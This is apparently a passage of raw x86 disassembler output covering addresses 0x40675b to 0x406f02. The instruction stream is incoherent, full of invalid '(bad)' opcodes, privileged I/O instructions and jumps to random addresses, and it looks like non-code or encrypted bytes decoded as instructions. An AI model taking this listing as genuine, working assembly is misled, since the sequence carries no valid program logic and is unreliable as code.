  40675b:	jbe    0x4067af
  40675d:	adc    ah,BYTE PTR [esi+ecx*8]
  406760:	add    ch,bl
  406762:	cmp    eax,0x3eca04df
  406767:	hlt    
  406768:	cmp    al,0xd6
  40676a:	out    0x76,eax
  40676c:	sbb    DWORD PTR [edi],ebx
  40676e:	cli    
  40676f:	pop    esp
  406770:	or     BYTE PTR [edx-0x3be63983],ah
  406776:	jnp    0x406742
  406778:	adc    ebx,DWORD PTR [edx+0x71ff3e84]
  40677e:	inc    ecx
  40677f:	push   edi
  406780:	push   ebx
  406781:	add    al,0xfc
  406783:	fsub   DWORD PTR ds:0x46c06617
  406789:	aaa    
  40678a:	jnp    0x40672a
  40678c:	pop    ecx
  40678d:	mov    esp,0xd68e776d
  406792:	bound  edx,QWORD PTR [eax]
  406794:	fs cdq 
  406796:	jmp    0x91bd71c7
  40679b:	mov    edx,0x213c7bb8
  4067a0:	test   al,0x5c
  4067a2:	in     al,0xc0
  4067a4:	clc    
  4067a5:	mov    ecx,0x492f6e53
  4067aa:	(bad)  
  4067ab:	jp     0x406749
  4067ad:	sub    DWORD PTR cs:[edi+esi*2-0x2b8f8a31],0xffffffa5
  4067b6:	mov    ds:0xbd9219a7,eax
  4067bb:	xor    al,0x1d
  4067bd:	(bad)  
  4067be:	adc    bh,ch
  4067c0:	push   edi
  4067c1:	fwait
  4067c2:	pop    edi
  4067c3:	jo     0x406762
  4067c5:	idiv   ebp
  4067c7:	bound  ecx,QWORD PTR [esi+0x5dba02fb]
  4067cd:	mov    ?,WORD PTR [esi+0x64f5480a]
  4067d3:	out    dx,eax
  4067d4:	jl     0x406803
  4067d6:	fdivr  DWORD PTR [eax+eiz*8+0x23]
  4067da:	xchg   ebp,edi
  4067dc:	pop    ebp
  4067dd:	test   ah,dh
  4067df:	(bad)  
  4067e0:	xor    eax,0xa7675cce
  4067e5:	lods   eax,DWORD PTR ds:[esi]
  4067e6:	push   edi
  4067e7:	js     0x406788
  4067e9:	xchg   DWORD PTR [esi],ecx
  4067eb:	scas   al,BYTE PTR es:[edi]
  4067ec:	sbb    BYTE PTR [ebx],al
  4067ee:	sub    esp,edx
  4067f0:	pop    esi
  4067f1:	sbb    eax,0x30599bba
  4067f6:	call   0xab84:0x35af6a8d
  4067fd:	inc    esi
  4067fe:	adc    BYTE PTR [edi+0x12],dl
  406801:	push   ss
  406802:	mov    dl,0x97
  406804:	test   eax,0x6be6beca
  406809:	dec    ecx
  40680a:	cs jo  0x406801
  40680d:	pop    ebx
  40680e:	adc    BYTE PTR gs:[edi+0x5],0x5d
  406813:	rcl    DWORD PTR [edi],0xcc
  406816:	mov    ds,edx
  406818:	(bad)  
  406819:	es jae 0x4067f6
  40681c:	loope  0x406805
  40681e:	popa   
  40681f:	pushf  
  406820:	adc    dh,ah
  406822:	pusha  
  406823:	xor    edi,DWORD PTR [ebx-0x2769bc80]
  406829:	xchg   ch,bl
  40682b:	cmp    ebx,DWORD PTR [ecx+0x6be9f85d]
  406831:	out    0x88,eax
  406833:	inc    eax
  406834:	pop    ds
  406835:	jo     0x4068b0
  406837:	sub    BYTE PTR [ebx+0x11],al
  40683a:	dec    ecx
  40683b:	mov    al,0xb8
  40683d:	mov    bl,0xe4
  40683f:	xor    ch,bh
  406841:	and    eax,DWORD PTR [ebx]
  406843:	adc    edx,ebp
  406845:	jmp    0xd9af4f05
  40684a:	mov    eax,0xca8279d2
  40684f:	mov    ebp,0x8812f12c
  406854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406855:	sub    dl,BYTE PTR [ecx]
  406857:	mov    al,ds:0x295f1e56
  40685c:	gs enter 0xe948,0x8c
  406861:	dec    edx
  406862:	jle    0x406897
  406864:	pop    esp
  406865:	sub    BYTE PTR [ebx+0x3b],0xbf
  406869:	cmp    ah,bh
  40686b:	mov    edx,DWORD PTR [ebp+0x70]
  40686e:	pop    ebp
  40686f:	aas    
  406870:	jo     0x40689d
  406872:	xor    al,0x3f
  406874:	push   esp
  406875:	inc    esi
  406876:	adc    al,0x2b
  406878:	pop    ds
  406879:	sub    eax,0x635d5e3d
  40687e:	inc    ebp
  40687f:	(bad)  
  406881:	inc    edi
  406882:	lock fs jmp 0xaa328a97
  406889:	pop    ebx
  40688a:	xor    al,0x2e
  40688c:	xchg   esi,eax
  40688d:	out    dx,eax
  40688e:	mov    dl,0x7
  406890:	aad    0x6b
  406892:	fmul   DWORD PTR [edx-0x2cd91cd3]
  406898:	cmc    
  406899:	cmp    eax,0x5e357ee2
  40689e:	pop    ss
  40689f:	lds    ebx,FWORD PTR [esi-0x2ab68c6e]
  4068a5:	mov    edx,0x7e7b72b2
  4068aa:	lds    edx,FWORD PTR [ecx]
  4068ac:	dec    edi
  4068ad:	cmp    eax,DWORD PTR [ecx+0x37688f03]
  4068b3:	jno    0x4068c8
  4068b5:	ins    BYTE PTR es:[edi],dx
  4068b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068b7:	icebp  
  4068b8:	inc    eax
  4068b9:	stc    
  4068ba:	xchg   ecx,eax
  4068bb:	stos   DWORD PTR es:[edi],eax
  4068bc:	xchg   esp,eax
  4068bd:	push   esp
  4068be:	xchg   dl,dl
  4068c0:	dec    esi
  4068c1:	or     al,0x15
  4068c3:	(bad)  
  4068c4:	pop    ebx
  4068c5:	(bad)
  4068c9:	jle    0x4068b0
  4068cb:	(bad)  
  4068cc:	fidiv  DWORD PTR [ecx-0x53]
  4068cf:	shr    bl,0xe1
  4068d2:	sub    DWORD PTR [edx-0x50],ebp
  4068d5:	fadd   QWORD PTR [ebx+edx*8]
  4068d8:	std    
  4068d9:	shl    BYTE PTR [ebx],cl
  4068db:	xlat   BYTE PTR ds:[ebx]
  4068dc:	sub    eax,0x6c768d0c
  4068e1:	shr    BYTE PTR [eax-0x4d],cl
  4068e4:	arpl   sp,bp
  4068e6:	dec    esp
  4068e7:	shl    DWORD PTR [esi-0x25815313],0x73
  4068ee:	or     DWORD PTR [eax],esp
  4068f0:	test   BYTE PTR [eax-0x65a805cd],cl
  4068f6:	mov    dl,0x5
  4068f8:	jecxz  0x406921
  4068fa:	stc    
  4068fb:	xor    eax,0x9362f8c2
  406900:	adc    eax,0xc37b22ad
  406905:	push   esi
  406906:	into   
  406907:	daa    
  406908:	sahf   
  406909:	sar    DWORD PTR [eax+0x17],cl
  40690c:	pushf  
  40690d:	inc    esp
  40690e:	or     eax,0xcae60ca3
  406913:	xor    dl,cl
  406915:	and    DWORD PTR [ecx+0x2641ece6],0x3df0dd6d
  40691f:	ins    DWORD PTR es:[edi],dx
  406920:	sbb    eax,0xa7985185
  406925:	mov    ah,0x74
  406927:	cmp    dh,dh
  406929:	sbb    al,BYTE PTR [ebx]
  40692b:	mov    edi,0x397883b9
  406930:	push   esi
  406931:	sbb    esp,edx
  406933:	mov    esi,0x30f2adc3
  406938:	pop    esi
  406939:	jb     0x406971
  40693b:	ds jnp 0x4068e1
  40693e:	jae    0x406955
  406940:	jno    0x406919
  406942:	es jo  0x406941
  406945:	inc    edx
  406946:	bound  ecx,QWORD PTR [eax-0x100d33e1]
  40694c:	addr16 inc esp
  40694e:	mov    cs,WORD PTR [ecx+0x2e84bd8d]
  406954:	ret    
  406955:	xchg   esp,eax
  406956:	ins    BYTE PTR es:[edi],dx
  406957:	cdq    
  406958:	ret    0xe40c
  40695b:	ja     0x406971
  40695d:	mov    dh,0xde
  40695f:	fild   DWORD PTR [edx+0x487daa6b]
  406965:	retf   
  406966:	repnz mov DWORD PTR [esi-0x36],edx
  40696a:	push   edi
  40696b:	lods   al,BYTE PTR ds:[esi]
  40696c:	pop    edx
  40696d:	xchg   ecx,eax
  40696e:	hlt    
  40696f:	lahf   
  406970:	outs   dx,DWORD PTR ds:[si]
  406972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406973:	xchg   esi,eax
  406974:	loop   0x406995
  406976:	pop    ebp
  406977:	sbb    eax,0xfc6020f7
  40697c:	inc    BYTE PTR [ebx]
  40697e:	call   0x494c7413
  406983:	loopne 0x406976
  406985:	scas   eax,DWORD PTR es:[edi]
  406986:	add    BYTE PTR [edx],0xe
  406989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40698a:	imul   DWORD PTR [edi+ebx*2]
  40698d:	push   ds
  40698e:	inc    esi
  40698f:	fs inc edi
  406991:	neg    DWORD PTR [ecx-0x5da1a944]
  406997:	pop    ds
  406998:	jg     0x40698d
  40699a:	ja     0x5f30bf61
  4069a0:	jmp    0x406945
  4069a2:	jnp    0x4069ea
  4069a4:	mov    WORD PTR [esi],?
  4069a6:	mov    esp,DWORD PTR [edx]
  4069a8:	sbb    eax,edi
  4069aa:	pop    eax
  4069ab:	mov    al,0x16
  4069ad:	push   ecx
  4069ae:	push   ecx
  4069af:	call   0xf827a74c
  4069b4:	int    0x4b
  4069b6:	fidivr DWORD PTR fs:[esi-0x2df21cfd]
  4069bd:	aas    
  4069be:	push   ds
  4069bf:	dec    edx
  4069c0:	fidivr WORD PTR [ecx-0x2d]
  4069c3:	cmp    eax,0x887544ee
  4069c8:	dec    esp
  4069c9:	nop
  4069ca:	add    DWORD PTR [eax],edx
  4069cc:	jo     0x40696b
  4069ce:	mov    ds:0x7aebb11e,eax
  4069d3:	cdq    
  4069d4:	or     al,0x4b
  4069d6:	test   eax,0x7760a66f
  4069db:	adc    edi,ecx
  4069dd:	and    al,0xba
  4069df:	adc    ecx,DWORD PTR [esi+eiz*1-0x7dbad45a]
  4069e6:	add    ch,BYTE PTR [ecx-0x28f07e00]
  4069ec:	mov    ch,0xe3
  4069ee:	popa   
  4069ef:	adc    bl,BYTE PTR [esi]
  4069f1:	sti    
  4069f2:	and    DWORD PTR [edi-0x9],ebx
  4069f5:	add    al,0x6d
  4069f7:	popa   
  4069f8:	and    al,0x7f
  4069fa:	cmp    eax,0x7f922215
  4069ff:	mov    edx,0xa1291c19
  406a04:	pop    es
  406a05:	call   0x5f83:0xd059cd74
  406a0c:	xchg   ebp,eax
  406a0d:	popa   
  406a0e:	mov    ebp,0x7f268286
  406a13:	fild   WORD PTR [eax+eax*2+0x1b]
  406a17:	xchg   edi,eax
  406a18:	ja     0x406a76
  406a1a:	dec    ecx
  406a1b:	xor    ecx,DWORD PTR [edx]
  406a1d:	call   0xbfc61c0e
  406a22:	pop    edx
  406a23:	aad    0x7c
  406a25:	cwde   
  406a26:	daa    
  406a27:	dec    eax
  406a28:	push   es
  406a29:	push   es
  406a2a:	jmp    0x85510e47
  406a2f:	xor    esp,DWORD PTR [ebx-0x40]
  406a32:	adc    bh,BYTE PTR [ebp+0x79]
  406a35:	xlat   BYTE PTR ds:[ebx]
  406a36:	inc    bp
  406a38:	into   
  406a39:	sub    DWORD PTR [esi],eax
  406a3b:	test   BYTE PTR [esi-0x6bfa0ad6],bl
  406a41:	enter  0x72f8,0x4d
  406a45:	sbb    DWORD PTR [edi],ebp
  406a47:	mov    edx,0x54018c0c
  406a4c:	mov    ch,0xb3
  406a4e:	psubsw mm6,QWORD PTR [ebp-0x21a5bf53]
  406a55:	in     eax,dx
  406a56:	xchg   esi,eax
  406a57:	push   es
  406a58:	loopne 0x406a9f
  406a5a:	mov    edx,0x9ade1dac
  406a5f:	ret    0xcd5b
  406a62:	scas   eax,DWORD PTR es:[edi]
  406a63:	stos   BYTE PTR es:[edi],al
  406a64:	fstp   st(7)
  406a66:	sbb    BYTE PTR [ebx-0x5cbfc15a],bl
  406a6c:	and    DWORD PTR [edx-0x7486747d],ebx
  406a72:	pop    ecx
  406a73:	inc    esi
  406a74:	loope  0x406a92
  406a76:	push   edi
  406a77:	icebp  
  406a78:	pop    esp
  406a79:	inc    ebx
  406a7a:	pop    esi
  406a7b:	int3   
  406a7c:	cmc    
  406a7d:	aad    0x9d
  406a7f:	out    0xef,eax
  406a81:	xchg   BYTE PTR [ecx+0xa],ch
  406a84:	pop    es
  406a85:	sub    eax,0xa8076d3b
  406a8a:	outs   dx,BYTE PTR ds:[esi]
  406a8b:	push   ecx
  406a8c:	loope  0x406adc
  406a8e:	je     0x406a9f
  406a90:	les    esp,FWORD PTR [ebx+0x5f]
  406a93:	or     BYTE PTR [esi+edi*2],0xf2
  406a97:	clc    
  406a98:	fisub  WORD PTR [ecx+0x1b]
  406a9b:	add    ebp,0x4fbe3a0a
  406aa1:	add    al,0xf4
  406aa3:	fistp  QWORD PTR [eax]
  406aa5:	dec    ebx
  406aa6:	inc    esp
  406aa7:	jbe    0x406ad4
  406aa9:	and    al,0x5c
  406aab:	sahf   
  406aac:	sahf   
  406aad:	xchg   edx,eax
  406aae:	(bad)  
  406aaf:	loopne 0x406a47
  406ab1:	pop    eax
  406ab2:	mov    cl,0xe1
  406ab4:	xchg   ebp,eax
  406ab5:	or     dh,BYTE PTR [ecx+eiz*2]
  406ab8:	ja     0x406aee
  406aba:	popa   
  406abb:	jbe    0x406a6e
  406abd:	mov    ebp,0xda492a11
  406ac2:	push   0xffffffcb
  406ac4:	and    bh,al
  406ac6:	cli    
  406ac7:	jle    0x406a7a
  406ac9:	fdivr  DWORD PTR [ebx]
  406acb:	and    ch,al
  406acd:	jnp    0x406ae5
  406acf:	aad    0x7c
  406ad1:	(bad)  
  406ad2:	sub    esp,esp
  406ad4:	jno    0x406b4c
  406ad6:	jo     0x406ae3
  406ad8:	mov    ebx,DWORD PTR [ebx-0x21]
  406adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406adc:	pop    edi
  406add:	cmp    eax,0x348dbcb
  406ae2:	neg    DWORD PTR [edi+0x74]
  406ae5:	sti    
  406ae6:	push   esi
  406ae7:	(bad)  
  406ae8:	in     eax,dx
  406ae9:	dec    eax
  406aea:	imul   esi,DWORD PTR [ebx],0x8545e28e
  406af0:	inc    esi
  406af1:	jno    0x406b0e
  406af3:	mov    eax,0x1804a894
  406af8:	pop    ecx
  406af9:	add    dh,BYTE PTR [ebp+ebp*4+0x71]
  406afd:	iret   
  406afe:	cwde   
  406aff:	cld    
  406b00:	leave  
  406b01:	dec    esp
  406b02:	fldenv [edi+esi*4-0x7e]
  406b06:	popf   
  406b07:	(bad)  
  406b08:	mov    bl,0x16
  406b0a:	push   edi
  406b0b:	mov    dl,0xa3
  406b0d:	ror    BYTE PTR [edi+0x61bd850d],1
  406b13:	rcl    BYTE PTR [ebp-0xf],cl
  406b16:	retf   
  406b17:	adc    DWORD PTR [ebp-0x5b1bac04],ebp
  406b1d:	jecxz  0x406ae4
  406b1f:	mov    bl,BYTE PTR [edx]
  406b21:	pushf  
  406b22:	push   ebp
  406b23:	pop    ebp
  406b24:	jmp    0xcb15:0xa5df01dd
  406b2b:	push   eax
  406b2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b2d:	ins    BYTE PTR es:[edi],dx
  406b2e:	in     eax,0x69
  406b30:	push   ebx
  406b31:	mov    bh,0x69
  406b33:	jle    0x406ac1
  406b35:	jb     0x406ba8
  406b37:	cmp    eax,0x58218a7b
  406b3c:	inc    eax
  406b3d:	pushf  
  406b3e:	dec    ebp
  406b3f:	not    DWORD PTR [edx+ebx*1]
  406b42:	sbb    edi,DWORD PTR [edx-0x2e19f41e]
  406b48:	sbb    DWORD PTR [ebx+0x2a],0x1f011dec
  406b4f:	in     al,0xd9
  406b51:	or     BYTE PTR [ebp-0x51],bl
  406b54:	push   ss
  406b55:	jl     0x406b01
  406b57:	in     eax,dx
  406b58:	fstp   DWORD PTR [edi]
  406b5a:	(bad)  
  406b5b:	mov    es,WORD PTR [ebp-0x7494b278]
  406b61:	xchg   edi,eax
  406b62:	add    ebx,DWORD PTR [edi+0xd4d1a25]
  406b68:	cmc    
  406b69:	daa    
  406b6a:	cli    
  406b6b:	jmp    0x406af9
  406b6d:	es push es
  406b6f:	pop    esp
  406b70:	inc    edi
  406b71:	cmp    DWORD PTR [ecx],ebx
  406b73:	pushf  
  406b74:	imul   edi,ecx,0x29
  406b77:	inc    esp
  406b78:	js     0x406b96
  406b7a:	pop    es
  406b7b:	and    esp,esi
  406b7d:	mov    ah,0x7f
  406b7f:	sti    
  406b80:	xchg   edx,eax
  406b81:	pop    ss
  406b82:	stc    
  406b83:	sbb    bl,BYTE PTR [edi-0x3db9212e]
  406b89:	enter  0xff2b,0xcf
  406b8d:	cmp    ebp,esp
  406b8f:	cmp    al,0xd
  406b91:	jnp    0x406b8b
  406b93:	std    
  406b94:	xchg   ebx,eax
  406b95:	(bad)  
  406b96:	adc    DWORD PTR ds:0xe2c6b60f,edx
  406b9c:	cmp    eax,0x1561b770
  406ba1:	iret   
  406ba2:	scas   al,BYTE PTR es:[edi]
  406ba3:	or     DWORD PTR [edi-0x55],esp
  406ba6:	inc    eax
  406ba7:	retf   0xe323
  406baa:	sub    eax,0xd3c3f663
  406baf:	ss mov edx,0xae6bc6f5
  406bb5:	sbb    al,ch
  406bb7:	mov    si,dx
  406bba:	sbb    DWORD PTR [esi+0xc],esi
  406bbd:	cmc    
  406bbe:	cli    
  406bbf:	cmp    DWORD PTR [ebp-0x665e9294],ecx
  406bc5:	loope  0x406bcc
  406bc7:	fisttp DWORD PTR [eax+0x11]
  406bca:	jae    0x406baf
  406bcc:	adc    bh,BYTE PTR [edi+0x52cf74f8]
  406bd2:	jecxz  0x406b90
  406bd4:	fwait
  406bd5:	dec    ebx
  406bd6:	jmp    DWORD PTR [edi-0x7098740b]
  406bdc:	adc    ebx,DWORD PTR ds:0xa97dfaf6
  406be2:	mov    eax,ds:0xba33aa5
  406be7:	pop    ebx
  406be8:	xchg   edx,eax
  406be9:	xlat   BYTE PTR gs:[ebx]
  406beb:	lahf   
  406bec:	dec    esi
  406bed:	or     al,0xfd
  406bef:	ins    DWORD PTR es:[edi],dx
  406bf0:	retf   
  406bf1:	ds out 0xa9,eax
  406bf4:	(bad)  
  406bf5:	iret   
  406bf6:	(bad)  
  406bf7:	sbb    bh,BYTE PTR [eax+0x4d89ca]
  406bfd:	sbb    esi,0x93f0753f
  406c03:	test   al,0x94
  406c05:	dec    ecx
  406c06:	test   al,0xb8
  406c08:	and    eax,0x45ec04f8
  406c0d:	shr    DWORD PTR [ebx],1
  406c0f:	imul   ebp,DWORD PTR [ebp-0x2d0060d8],0x10
  406c16:	(bad)  
  406c17:	mov    cl,0xa4
  406c19:	sub    al,0x25
  406c1b:	mov    DWORD PTR [ebp-0x6dbe28c9],edx
  406c21:	ret    
  406c22:	aaa    
  406c23:	jmp    0x36453376
  406c28:	jge    0x406c9b
  406c2a:	dec    ebp
  406c2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c2c:	scas   al,BYTE PTR es:[edi]
  406c2d:	cmc    
  406c2e:	scas   eax,DWORD PTR es:[edi]
  406c2f:	lock adc eax,0xe9af132e
  406c35:	cdq    
  406c36:	aad    0xd1
  406c38:	popa   
  406c39:	stc    
  406c3a:	les    esp,FWORD PTR [esi+0x34]
  406c3d:	add    al,0x59
  406c3f:	call   0xa64d31e6
  406c44:	ret    0x7abe
  406c47:	daa    
  406c48:	pop    ecx
  406c49:	add    bh,BYTE PTR [esp+eax*1+0x3d09bc40]
  406c50:	fnstenv ss:[ebx+edi*4-0x741b7e1a]
  406c58:	or     DWORD PTR [edi-0x69897850],esi
  406c5e:	jbe    0x406cdc
  406c60:	cmp    al,0x39
  406c62:	jb     0x406c10
  406c64:	call   0x55e3:0x360c0105
  406c6b:	xchg   esp,eax
  406c6c:	pop    edi
  406c6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c6e:	or     esp,DWORD PTR [ebx+0x5cb960fd]
  406c74:	fld    TBYTE PTR [edi]
  406c76:	mov    ebp,0x352c63f5
  406c7b:	and    esi,DWORD PTR [ecx]
  406c7d:	aaa    
  406c7e:	cwde   
  406c7f:	pop    edx
  406c80:	sub    edi,DWORD PTR [esi-0x1c]
  406c83:	stos   DWORD PTR es:[edi],eax
  406c84:	test   al,0x1e
  406c86:	in     eax,0xe0
  406c88:	shl    DWORD PTR [esp+ebp*4-0x67240bdf],cl
  406c8f:	sub    bh,BYTE PTR [ecx+0x5e]
  406c92:	cmp    BYTE PTR [esi-0x5f],ch
  406c95:	pop    ebx
  406c96:	adc    al,0xbc
  406c98:	or     al,0x4f
  406c9a:	mov    edx,0x7eff435a
  406c9f:	cmc    
  406ca0:	ds pop ss
  406ca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ca3:	add    BYTE PTR [ebp+0x5b],cl
  406ca6:	popf   
  406ca7:	les    ebx,FWORD PTR [eax+0x690f11dc]
  406cad:	inc    ebp
  406cae:	jns    0x406cfa
  406cb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cb1:	aas    
  406cb2:	sub    edx,DWORD PTR [ecx+0x4b]
  406cb5:	sbb    bl,bl
  406cb7:	dec    eax
  406cb8:	neg    BYTE PTR [ecx]
  406cba:	add    eax,0x7a31fb04
  406cbf:	in     al,dx
  406cc0:	mov    al,0x62
  406cc2:	ret    
  406cc3:	and    eax,0xb8563355
  406cc8:	in     eax,0xb2
  406cca:	adc    DWORD PTR [edi],0x1b
  406ccd:	mov    ds:0x35c1784a,eax
  406cd2:	mov    ebx,0x5026b731
  406cd7:	jge    0x406d34
  406cd9:	in     al,dx
  406cda:	in     al,0x5e
  406cdc:	(bad)  
  406cdd:	sub    ah,BYTE PTR [ecx+0x3f]
  406ce0:	std    
  406ce1:	repnz and al,0x21
  406ce4:	loopne 0x406cdc
  406ce6:	jmp    0x1cd9:0x71eb644c
  406ced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cee:	inc    ebp
  406cef:	int3   
  406cf0:	lods   al,BYTE PTR ds:[esi]
  406cf1:	mov    cl,0x45
  406cf3:	clc    
  406cf4:	sbb    al,0xb6
  406cf6:	jge    0x406d66
  406cf8:	mov    al,ds:0x28db555
  406cfd:	mov    bh,0xf8
  406cff:	push   edi
  406d00:	sub    eax,0x6e8200c3
  406d05:	out    0xaf,al
  406d07:	test   eax,0xdbacca67
  406d0c:	pop    esp
  406d0d:	dec    ecx
  406d0e:	int3   
  406d0f:	dec    edx
  406d10:	scas   al,BYTE PTR es:[edi]
  406d11:	ret    0xb600
  406d14:	(bad)  
  406d15:	(bad)  
  406d16:	pop    ss
  406d17:	jp     0x406d8a
  406d19:	pop    ss
  406d1a:	das    
  406d1b:	test   eax,0x420e4896
  406d20:	mov    ah,0xac
  406d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d23:	fwait
  406d24:	inc    esp
  406d25:	sbb    edi,DWORD PTR [eax-0x2bfabbdd]
  406d2b:	jmp    0x406d21
  406d2d:	ret    0x57ff
  406d30:	add    eax,DWORD PTR [edx+ecx*2+0x598783fa]
  406d37:	dec    esi
  406d38:	pop    ecx
  406d39:	cs dec ecx
  406d3b:	icebp  
  406d3c:	rol    ecx,cl
  406d3e:	vhaddpd xmm7,xmm7,XMMWORD PTR [edx+0x273da5f6]
  406d46:	cmc    
  406d47:	adc    DWORD PTR [eax+0x37c639c8],0xe95f9f99
  406d51:	jbe    0x406d38
  406d53:	mov    dl,0xfd
  406d55:	cmp    DWORD PTR [eax],edi
  406d57:	ja     0x406dba
  406d59:	sub    edx,DWORD PTR [edi+eiz*8+0x2]
  406d5d:	or     BYTE PTR [ecx+0x2e],dh
  406d60:	out    0x68,al
  406d62:	inc    edi
  406d63:	xchg   ebx,eax
  406d64:	mov    ds:0xea1bc7ad,eax
  406d69:	jno    0x406cf3
  406d6b:	jge    0x406d4b
  406d6d:	mov    cl,0x52
  406d6f:	sbb    BYTE PTR [ecx-0x62],cl
  406d72:	add    ecx,ebp
  406d74:	pop    ebx
  406d75:	push   edx
  406d76:	xchg   dl,bl
  406d78:	clc    
  406d79:	cli    
  406d7a:	in     eax,dx
  406d7b:	fnstsw WORD PTR [eax]
  406d7d:	lock jge 0x406dc6
  406d80:	cmp    DWORD PTR ds:0x4493aeb8,ebx
  406d86:	sub    al,0x4
  406d88:	(bad)  
  406d89:	push   es
  406d8a:	stos   DWORD PTR es:[edi],eax
  406d8b:	jg     0x406d8c
  406d8d:	jnp    0x406db6
  406d8f:	inc    esp
  406d90:	dec    ebx
  406d91:	pusha  
  406d92:	cmp    eax,0xf9e1d092
  406d97:	test   DWORD PTR [esi-0x4e9f537b],edx
  406d9d:	sub    al,0xd8
  406d9f:	mov    ah,0x3a
  406da1:	(bad)  
  406da2:	dec    esp
  406da3:	lea    esi,[ebx+0x17fe0958]
  406da9:	int3   
  406daa:	jge    0x406dc5
  406dac:	pop    es
  406dad:	mov    al,ds:0xd1cc42a9
  406db2:	sbb    eax,0xb117c10e
  406db7:	sub    dl,bh
  406db9:	hlt    
  406dba:	das    
  406dbb:	add    al,ch
  406dbd:	loop   0x406d73
  406dbf:	add    edi,DWORD PTR [ebx]
  406dc1:	and    eax,0x51d7bf9f
  406dc6:	(bad)  
  406dc7:	stos   BYTE PTR es:[edi],al
  406dc8:	sub    DWORD PTR [edx-0x74],0xffffffc6
  406dcc:	jmp    0x34a25a2b
  406dd1:	inc    esi
  406dd2:	cmp    edi,DWORD PTR [ebp-0x1f4944fd]
  406dd8:	test   eax,0xd62d3012
  406ddd:	test   al,0xad
  406ddf:	nop
  406de0:	pop    es
  406de1:	loop   0x406d79
  406de3:	imul   ebp,DWORD PTR [eax],0x20
  406de6:	(bad)  
  406de7:	mov    edi,0x3cf840c0
  406dec:	jle    0x406da5
  406dee:	mov    ah,BYTE PTR ds:[esi]
  406df1:	pop    edi
  406df2:	mov    DWORD PTR [ecx+0x42],edi
  406df5:	dec    ebx
  406df6:	(bad)  
  406df7:	neg    BYTE PTR [ebx]
  406df9:	sub    al,0x7a
  406dfb:	test   DWORD PTR [ecx-0x723543fd],0xd6948cbb
  406e05:	adc    bh,0x3c
  406e08:	fcmovnu st,st(7)
  406e0a:	sbb    bh,BYTE PTR [ebp-0x1b]
  406e0d:	cmp    esi,DWORD PTR [eax-0x7b]
  406e10:	test   DWORD PTR ds:0x7917143a,edx
  406e16:	xchg   ebx,eax
  406e17:	mov    edi,0xad38fdca
  406e1c:	cmp    BYTE PTR [ecx-0x6d],bh
  406e1f:	test   BYTE PTR [edi-0x4f],0x0
  406e23:	call   0xccd1dce4
  406e28:	js     0x406e7f
  406e2a:	(bad)  
  406e2b:	xchg   edx,eax
  406e2c:	or     eax,0xa1781a15
  406e31:	push   eax
  406e32:	in     al,dx
  406e33:	sbb    BYTE PTR [ecx-0x436a1035],bl
  406e39:	popf   
  406e3a:	sub    DWORD PTR [eax-0xd2bafda],esi
  406e40:	ror    DWORD PTR [ebx],1
  406e42:	adc    eax,0x6febbfd5
  406e47:	xchg   esp,eax
  406e48:	(bad)  
  406e49:	push   ss
  406e4a:	or     ah,BYTE PTR [ebx]
  406e4c:	sbb    DWORD PTR [eax],esi
  406e4e:	cli    
  406e4f:	popa   
  406e50:	add    al,0x77
  406e52:	dec    ebx
  406e53:	push   ecx
  406e54:	inc    eax
  406e55:	les    esp,FWORD PTR [edi]
  406e57:	(bad)  
  406e58:	aaa    
  406e59:	out    dx,eax
  406e5a:	aaa    
  406e5b:	out    dx,eax
  406e5c:	push   0xffffff91
  406e5e:	inc    ebp
  406e5f:	cdq    
  406e60:	dec    eax
  406e61:	loop   0x406edc
  406e63:	sub    eax,0x1765f78
  406e68:	jns    0x406ee5
  406e6a:	cmp    eax,0x83095384
  406e6f:	shr    eax,cl
  406e71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e72:	and    al,0xe1
  406e74:	hlt    
  406e75:	gs call 0x991e33c8
  406e7b:	xchg   esp,eax
  406e7c:	mov    DWORD PTR [ecx+0x5a013f6e],eax
  406e82:	sbb    eax,0xd9ae5a1c
  406e87:	in     al,dx
  406e88:	out    dx,eax
  406e89:	loop   0x406ec0
  406e8b:	push   ecx
  406e8c:	retf   0xab8e
  406e8f:	sti    
  406e90:	sahf   
  406e91:	daa    
  406e92:	pop    edi
  406e93:	mov    BYTE PTR [edi+0x52874de2],0x9c
  406e9a:	mov    cs,WORD PTR [edx]
  406e9c:	push   ebx
  406e9d:	loop   0x406ed3
  406e9f:	stc    
  406ea0:	xor    ch,dl
  406ea2:	js     0x406ef0
  406ea4:	push   ds
  406ea5:	call   0xd654:0xfd98cbfb
  406eac:	cwde   
  406ead:	arpl   sp,bp
  406eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406eb0:	fnop   
  406eb2:	push   ss
  406eb3:	add    DWORD PTR [edi],ebx
  406eb5:	and    ah,al
  406eb7:	inc    eax
  406eb8:	mov    edx,0x8579bda4
  406ebd:	fwait
  406ebe:	pop    ss
  406ebf:	mov    esp,0xb117a8b6
  406ec4:	xchg   edx,eax
  406ec5:	nop
  406ec6:	sub    al,0x67
  406ec8:	rcl    esi,0x8e
  406ecb:	sub    bh,BYTE PTR [edi]
  406ecd:	push   ss
  406ece:	cli    
  406ecf:	jge    0x406ef4
  406ed1:	pop    es
  406ed2:	xor    al,0x27
  406ed4:	test   BYTE PTR fs:[edx+0x1c0b9cb2],al
  406edb:	jnp    0x406f2e
  406edd:	jb     0x406ef0
  406edf:	test   eax,0x66412416
  406ee4:	or     BYTE PTR [ecx],dh
  406ee6:	imul   edi,DWORD PTR [esi-0x7a],0x5a33f544
  406eed:	rcl    al,0xdc
  406ef0:	jb     0x406ee2
  406ef2:	or     esp,esi
  406ef4:	inc    ebx
  406ef5:	push   eax
  406ef6:	neg    BYTE PTR [eax-0x6a]
  406ef9:	inc    esp
  406efa:	mov    dh,0x7c
  406efc:	sub    eax,0x41dd6bb3
  406f01:	xchg   ebp,eax
  406f02:	xor    eax,0x5a050c95
